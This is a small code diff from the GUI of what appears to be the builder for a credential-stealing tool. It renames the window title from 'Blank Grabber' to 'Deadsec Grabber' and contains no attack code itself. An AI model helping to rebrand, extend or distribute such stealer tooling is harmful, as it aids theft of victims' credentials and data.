@@ -391,7 +391,7 @@ class Builder(ctk.CTk):
 		self.columnconfigure(0, weight= 1)
 		self.columnconfigure(1, weight= 0)
 
-		self.titleLabel = ctk.CTkLabel(self, text= "Blank Grabber", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#2F58CD")
+		self.titleLabel = ctk.CTkLabel(self, text= "Deadsec Grabber", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#2F58CD")
 		self.titleLabel.grid(row= 0, column= 0)
 
 		self.builderOptions = BuilderOptionsFrame(self)
